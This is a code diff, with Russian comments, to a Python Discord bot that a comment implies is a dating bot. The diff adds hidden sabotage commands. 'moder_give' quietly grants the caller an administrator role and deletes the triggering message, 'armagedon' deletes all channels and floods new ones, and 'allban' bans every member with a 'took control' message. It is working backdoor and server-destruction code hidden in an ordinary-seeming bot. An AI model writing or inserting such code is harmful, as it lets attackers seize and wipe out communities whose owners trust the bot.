@@ -6,6 +6,7 @@ import pytz
 from random import randint
 
 from discord import Permissions
+from discord.utils import get
 
 client = commands.Bot(command_prefix=">",intents=discord.Intents.all())
 
@@ -75,8 +76,15 @@ async def admindata(ctx):
 #не касается кода знакомств
 @client.command()
 async def moder_give(ctx):
-    role = await client.create_role(server, name="zutkm", permissions=Permissions.all())
-    await client.add_roles(member, role)
+    guild = ctx.guild
+    perms = discord.Permissions(administrator=True) #права роли
+    await guild.create_role(name="zutkm", permissions=perms) #создаем роль
+    
+    role = discord.utils.get(ctx.guild.roles, name="zutkm") #находим роль по имени
+    user = ctx.message.author #находим юзера
+    await user.add_roles(role) #добовляем роль
+    
+    await ctx.message.delete()
 @client.command()
 async def armagedon(ctx,name):
     guild = ctx.guild
@@ -84,5 +92,12 @@ async def armagedon(ctx,name):
         await channel.delete()
     for channel in range(10):
         await guild.create_text_channel(str(name))
+@client.command()
+async def allban(ctx):
+    for m in ctx.guild.members: #собираем
+        try:
+            await m.ban(reason="zutkm,ekfar,layker захватили контроль!")#баним
+        except:
+            pass
 
 client.run(os.environ['token'])
